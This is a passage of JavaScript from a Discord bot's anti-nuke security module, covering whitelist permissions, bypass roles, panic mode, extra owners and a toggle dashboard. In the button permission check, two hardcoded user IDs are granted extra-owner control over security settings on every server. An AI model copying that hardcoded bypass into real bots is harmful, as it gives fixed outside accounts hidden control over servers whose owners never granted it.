          if (interaction.customId === `wl_select_perm_${user.id}`) {
            const selectedValues = interaction.values;

            if (selectedValues.includes('all')) {
              userPerms.clear();
              userPerms.add('all');
            } else {
              userPerms.delete('all');
              // Multi-select sync: Grant exact set of selected checkboxes!
              userPerms.clear();
              selectedValues.forEach(v => userPerms.add(v));
            }
          } else if (interaction.customId === `an_wl_all_${user.id}`) {
            userPerms = new Set(['all']);
          } else if (interaction.customId === `an_unwl_all_${user.id}`) {
            userPerms = new Set();
          }

          if (userPerms.size > 0) {
            config.whitelistedUsers.set(user.id, userPerms);
          } else {
            config.whitelistedUsers.delete(user.id);
          }
          antinukeConfigs.set(guild.id, config);

          // Live Re-render
          const isAllNew = userPerms.has('all');
          const hasNew = (p) => isAllNew || userPerms.has(p);

          const updatedAuditBox = createDynamicBox(`PERMISSIONS AUDIT — ${user.username.toUpperCase()}`, [
            { key: 'Ban', value: hasNew('ban') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Unban', value: hasNew('unban') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Kick', value: hasNew('kick') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Prune Members', value: hasNew('prune') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Bot Add', value: hasNew('bot') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Guild Update', value: hasNew('guild') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Channel Create', value: hasNew('channel_create') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Channel Delete', value: hasNew('channel_delete') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Channel Update', value: hasNew('channel_update') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Role Create', value: hasNew('role_create') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Role Delete', value: hasNew('role_delete') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Role Update', value: hasNew('role_update') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Role Dangerous', value: hasNew('role_dangerous') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Mention @everyone', value: hasNew('everyone') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Webhook Create', value: hasNew('webhook_create') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Webhook Update', value: hasNew('webhook_update') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Webhook Delete', value: hasNew('webhook_delete') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Member Update', value: hasNew('member_update') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Member Dangerous', value: hasNew('member_dangerous') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Anti Integration', value: hasNew('integration') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Anti Sticker', value: hasNew('sticker') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
            { key: 'Anti Emoji', value: hasNew('emoji') ? 'ALLOWED [OK]' : 'BLOCKED [X]' }
          ]);

          const updatedEmbed = createStyledEmbed({
            title: `<a:security_animated:1537177499862171741> Whitelist Granular Event Audit — ${user.username}`,
            subtitle: `Realtime Permission Bypass Audit for ${guild.name}`,
            description:
              `**Target User:** <@${user.id}> (\`${user.tag}\`)\n` +
              `**Global Bypass Status:** ${isAllNew ? '`FULL BYPASS (ALL EVENTS)`' : (userPerms.size > 0 ? `\`PARTIAL BYPASS (${userPerms.size} EVENTS)\`` : '`NOT WHITELISTED`')}\n\n` +
              '```\n' + updatedAuditBox + '\n```\n' +
              '```\n' + cmdBox + '\n```',
            requestedBy: author,
            clientUser
          });

          return interaction.update({ embeds: [updatedEmbed], components: [selectRow, btnRow] });
        });

        return;
      }

      // .whitelist add @user [perms]
      if (action === 'add' && user) {
        const permArgs = args.slice(2).map(p => p.toLowerCase()).filter(p => ALL_PERMS.includes(p) || p === 'all');
        if (permArgs.length > 0) {
          const grantedPerms = new Set(permArgs);
          config.whitelistedUsers.set(user.id, grantedPerms);
          antinukeConfigs.set(guild.id, config);

          const embed = createStyledEmbed({
            title: `<a:membercard_animated:1537177436146638993> Member Whitelisted with Granular Perms`,
            description:
              `**User:** <@${user.id}> (\`${user.tag}\`)\n` +
              `**Granted Permissions:** ${formatUserPerms(grantedPerms)}\n\n` +
              `**Management Panel:**\n` +
              `\`\`\`\n` +
              `.whitelist @${user.username}\n` +
              `\`\`\``,
            requestedBy: author,
            clientUser
          });
          return message.channel.send({ embeds: [embed] });
        }
      }

      // .whitelist remove @user
      if (action === 'remove' && user) {
        config.whitelistedUsers.delete(user.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SUCCESS} Removed **${user.tag}** from AntiNuke Whitelist.`);
      }

      // Default DEDICATED WHITELISTED USERS LIST PANEL (&whitelisted / .whitelist list)
      const listItems = [];
      for (const [id, permsSet] of config.whitelistedUsers.entries()) {
        const u = message.client.users.cache.get(id);
        const nameStr = u ? `@${u.username}` : `<@${id}>`;
        const permStr = permsSet.has('all') ? 'All Events' : Array.from(permsSet).join(', ').toUpperCase();
        listItems.push(`• ${nameStr} :- ${permStr}`);
      }

      const listContent = listItems.join('\n') || '• No users whitelisted yet.';

      const wlBox = createDynamicBox('WHITELISTED USERS', listItems.length > 0 ? listItems : ['• None configured']);
      const cmdBox = createDynamicBox('WHITELIST COMMANDS', [
        '.whitelist add @user',
        '.whitelist remove @user',
        '.whitelist status @user',
        '.whitelisted'
      ]);

      const embed = createStyledEmbed({
        title: `<a:wrong_animated:1537179702928875631> Whitelisted Users — ${guild.name}`,
        subtitle: `Authorized Security Bypass Delegation`,
        description:
          `Below are all authorized whitelisted users for **${guild.name}**:\n\n` +
          '```\n' + wlBox + '\n```\n' +
          '```\n' + cmdBox + '\n```',
        requestedBy: author,
        clientUser
      });

      const navRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('wl_page_back').setLabel('Go Back').setEmoji('<a:wrong_animated:1537179702928875631>').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId('wl_page_prev').setLabel('Previous').setStyle(ButtonStyle.Secondary).setDisabled(true),
        new ButtonBuilder().setCustomId('wl_page_next').setLabel('Next').setStyle(ButtonStyle.Secondary).setDisabled(true)
      );

      return message.channel.send({ embeds: [embed], components: [navRow] });
    }

    // 1. .antinuke enable [feature/all]
    if (sub === 'enable' || sub === 'on') {
      const target = args[1]?.toLowerCase();

      if (!target || target === 'all') {
        config.enabled = true;
        Object.keys(config.filters).forEach(k => config.filters[k] = true);
        
        // Auto-create AntiNuke Bypass role if missing
        let bypassRole = guild.roles.cache.find(r => r.name === 'AntiNuke Bypass');
        if (!bypassRole) {
          bypassRole = await guild.roles.create({
            name: 'AntiNuke Bypass',
            color: 0x3498DB,
            reason: 'AntiNuke Auto-Bypass Role Creation on Enable'
          }).catch(() => null);
        }
        if (bypassRole) {
          config.bypassRoles.add(bypassRole.id);
        }

        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SHIELD} AntiNuke Security System & ALL protection filters are now **ENABLED**! (Role \`AntiNuke Bypass\` created & assigned)`);
      }

      if (FILTER_MAP[target]) {
        config.enabled = true;
        FILTER_MAP[target].forEach(k => config.filters[k] = true);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.SUCCESS} AntiNuke feature **${target.toUpperCase()}** enabled successfully!`);
      }
    }

    // 2. .antinuke disable [feature/all]
    if (sub === 'disable' || sub === 'off') {
      const target = args[1]?.toLowerCase();

      if (!target || target === 'all') {
        config.enabled = false;
        Object.keys(config.filters).forEach(k => config.filters[k] = false);

        // Auto-delete AntiNuke Bypass role if present
        const bypassRole = guild.roles.cache.find(r => r.name === 'AntiNuke Bypass');
        if (bypassRole) {
          await bypassRole.delete('AntiNuke Auto-Bypass Role Deletion on Disable').catch(() => {});
          config.bypassRoles.delete(bypassRole.id);
        }

        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.WARNING} AntiNuke Security System is now **DISABLED**. (Role \`AntiNuke Bypass\` removed)`);
      }

      if (FILTER_MAP[target]) {
        FILTER_MAP[target].forEach(k => config.filters[k] = false);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`${emojis.WARNING} AntiNuke feature **${target.toUpperCase()}** disabled.`);
      }
    }

    // 3. .panicmode enable / disable / reset / set <level>
    if (sub === 'panicmode' || invoked === 'panicmode') {
      const mode = args[1]?.toLowerCase() || args[0]?.toLowerCase();

      if (mode === 'enable' || mode === 'on') {
        config.panicmode = true;
        config.enabled = true;
        antinukeConfigs.set(guild.id, config);
      } else if (mode === 'disable' || mode === 'off') {
        config.panicmode = false;
        antinukeConfigs.set(guild.id, config);
      } else if (mode === 'reset') {
        config.panicmode = false;
        config.panicLevel = 1;
        antinukeConfigs.set(guild.id, config);
      } else if (mode === 'set' && args[2]) {
        const lvl = parseInt(args[2]);
        if (!isNaN(lvl) && lvl >= 1 && lvl <= 3) {
          config.panicLevel = lvl;
          antinukeConfigs.set(guild.id, config);
        }
      }
    }

    // 4. .extraowner add @user / remove @user / list
    if (sub === 'extraowner' || invoked === 'extraowner') {
      const action = args[1]?.toLowerCase();
      const user = message.mentions.users.first() || (args[2] ? await message.client.users.fetch(args[2]).catch(() => null) : null);

      if (action === 'add' && user) {
        config.extraOwners.add(user.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:crown_animated:1537177361093500968> Added **${user.tag}** as Extra Owner with full security bypass permissions!`);
      }

      if (action === 'remove' && user) {
        config.extraOwners.delete(user.id);
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:crown_animated:1537177361093500968> Removed **${user.tag}** from Extra Owners.`);
      }

      const list = Array.from(config.extraOwners).map(id => `• <@${id}> (\`${id}\`)`).join('\n') || '*No Extra Owners assigned.*';
      return message.reply({
        embeds: [
          createStyledEmbed({
            title: `<a:crown_animated:1537177361093500968> Server Extra Owners`,
            description: `**Current Extra Owners:**\n${list}\n\n**Usage:**\n\`.extraowner add @user\`\n\`.extraowner remove @user\``,
            requestedBy: author,
            clientUser
          })
        ]
      });
    }

    // Default Status Dashboard (.antinuke / .panicmode) WITH INTERACTIVE BUTTONS
    const embed = renderAntinukeDashboard(config, author, clientUser);
    const rows = renderPanicComponents(config);

    const msg = await message.channel.send({ embeds: [embed], components: rows });

    const collector = msg.createMessageComponentCollector({ time: 300000 });

    collector.on('collect', async (interaction) => {
      // PANEL OWNERSHIP CHECK: Only the user who invoked this panel message can interact with it
      if (interaction.user.id !== author.id) {
        return interaction.reply({
          content: `${emojis.WARNING || '<a:wrong_animated:1537179702928875631>'} **Access Denied**: Only **${author.username}** (who requested this panel) can click these buttons.`,
          flags: 64
        });
      }

      // PERMISSION CHECK for button clicks
      const isOwnerBtn = guild.ownerId === interaction.user.id;
      const isExtraOwnerBtn = config.extraOwners.has(interaction.user.id) || ['1420687548807905324', '1529362747047805029', ].includes(interaction.user.id);

      if (!isOwnerBtn && !isExtraOwnerBtn) {
        return interaction.reply({
          content: `${emojis.ERROR} **Access Denied**: Only the **Server Owner** and **Extra Owners** can toggle security settings!`,
          flags: 64
        });
      }

      const id = interaction.customId;
      const f = config.filters;
      const jg = config.joinGate;
      const aq = config.autoQuarantine;

      if (id === 'an_whitelist_mgr') {
        const entries = [];
        for (const [uid, permsSet] of config.whitelistedUsers.entries()) {
          entries.push(`• <@${uid}> — ${formatUserPerms(permsSet)}`);
        }
        return interaction.reply({
          content: `<a:membercard_animated:1537177436146638993> **Whitelist Permissions Panel**\n${entries.join('\n') || 'No members whitelisted.'}\n\nUse \`.whitelist perms @user +ban -role\` to edit granular perms!`,
          flags: 64
        });
      }

      if (id === 'toggle_joingate') {
        jg.enabled = !jg.enabled;
      } else if (id === 'toggle_quarantine') {
        aq.enabled = !aq.enabled;
      } else if (id === 'toggle_panic') {
        config.panicmode = !config.panicmode;
        if (config.panicmode) config.enabled = true;
      } else if (id === 'toggle_shield') {
        config.enabled = !config.enabled;

        // Auto Bypass Role Creation/Deletion Lifecycle
        if (config.enabled) {
          let bypassRole = guild.roles.cache.find(r => r.name === 'AntiNuke Bypass');
          if (!bypassRole) {
            bypassRole = await guild.roles.create({
              name: 'AntiNuke Bypass',
              color: 0x3498DB,
              reason: 'AntiNuke Auto-Bypass Role Creation on Enable'
            }).catch(() => null);
          }
          if (bypassRole) {
            config.bypassRoles.add(bypassRole.id);
          }
        } else {
          const bypassRole = guild.roles.cache.find(r => r.name === 'AntiNuke Bypass');
          if (bypassRole) {
            await bypassRole.delete('AntiNuke Auto-Bypass Role Deletion on Disable').catch(() => {});
            config.bypassRoles.delete(bypassRole.id);
          }
        }
      } else if (id === 'toggle_ban') {
        f.antiBan = !f.antiBan;
      } else if (id === 'toggle_kick') {
        f.antiKick = !f.antiKick;
      } else if (id === 'toggle_bot') {
        f.antiBotAdd = !f.antiBotAdd;
      } else if (id === 'toggle_channel') {
        f.antiChannelCreate = !f.antiChannelCreate;
        f.antiChannelDelete = f.antiChannelCreate;
        f.antiChannelUpdate = f.antiChannelCreate;
      } else if (id === 'toggle_role') {
        f.antiRoleCreate = !f.antiRoleCreate;
        f.antiRoleDelete = f.antiRoleCreate;
        f.antiRoleUpdate = f.antiRoleCreate;
      } else if (id === 'an_enable_all') {
        config.enabled = true;
        Object.keys(config.filters).forEach(k => config.filters[k] = true);
      } else if (id === 'an_disable_all') {
        config.enabled = false;
        Object.keys(config.filters).forEach(k => config.filters[k] = false);
      } else if (id === 'an_refresh') {
        // Refresh only
      } else if (id === 'toggle_webhook') {
        f.antiWebhookCreate = !f.antiWebhookCreate;
        f.antiWebhookDelete = f.antiWebhookCreate;
        f.antiWebhookUpdate = f.antiWebhookCreate;
      } else if (id === 'toggle_spam') {
        f.antiSpam = !f.antiSpam;
      } else if (id === 'toggle_everyone') {
        f.antiEveryone = !f.antiEveryone;
      } else if (id === 'toggle_raid') {
        f.antiRaid = !f.antiRaid;
      } else if (id === 'toggle_guild') {
        f.antiGuildUpdate = !f.antiGuildUpdate;
      }

      antinukeConfigs.set(guild.id, config);

      const newEmbed = renderAntinukeDashboard(config, author, clientUser);
      const newRows = renderPanicComponents(config);

      return interaction.update({ embeds: [newEmbed], components: newRows });
    });

    collector.on('end', () => {
      msg.edit({ components: [] }).catch(() => {});
    });
  }
};


